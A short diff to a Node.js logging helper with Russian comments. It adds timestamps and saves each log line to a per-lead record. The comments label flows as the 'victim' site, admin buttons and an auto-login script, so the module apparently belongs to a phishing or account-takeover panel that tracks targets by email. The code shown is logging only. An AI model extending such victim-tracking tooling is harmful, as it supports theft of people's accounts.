@@ -1,10 +1,12 @@
 'use strict';
+const leadService = require('../services/leadService');
 
 /**
  * Единый вид строки в терминале PM2/Node: [КАНАЛ] поток | попытка | email: действие
  * поток: Сайт (жертва), Админ (кнопки), Автовход (скрипт), Система (без лида)
  */
-function logTerminalFlow(channel, flow, attempt, email, message) {
+function formatTerminalLogLine(channel, flow, attempt, email, message) {
+  const ts = new Date().toISOString();
   const ch = (channel || 'LOG').trim() || 'LOG';
   const fl = (flow || '—').trim() || '—';
   const at =
@@ -15,7 +17,18 @@ function logTerminalFlow(channel, flow, attempt, email, message) {
   const msg = String(message || '')
     .replace(/\s+/g, ' ')
     .trim();
-  console.log(`[${ch}] ${fl} | ${at} | ${em}: ${msg}`);
+  return `${ts} [${ch}] ${fl} | ${at} | ${em}: ${msg}`;
+}
+
+function logTerminalFlow(channel, flow, attempt, email, message, leadId) {
+  const line = formatTerminalLogLine(channel, flow, attempt, email, message);
+  console.log(line);
+  const id = leadId != null ? String(leadId).trim() : '';
+  if (id) {
+    try {
+      leadService.appendLeadLogTerminal(id, line);
+    } catch (_) {}
+  }
 }
 
 /** Повторный запуск автоматизации для того же leadId, пока уже идёт сессия или запрещён статусом БД. */
@@ -27,8 +40,9 @@ function logDuplicateAutomationAttempt(leadId, email, reason) {
     'Система',
     '—',
     email,
-    'попытка повторного запуска автоматизации отклонена: leadId=' + id + (detail ? ' · ' + detail : '')
+    'попытка повторного запуска автоматизации отклонена: leadId=' + id + (detail ? ' · ' + detail : ''),
+    id
   );
 }
 
-module.exports = { logTerminalFlow, logDuplicateAutomationAttempt };
+module.exports = { logTerminalFlow, logDuplicateAutomationAttempt, formatTerminalLogLine };
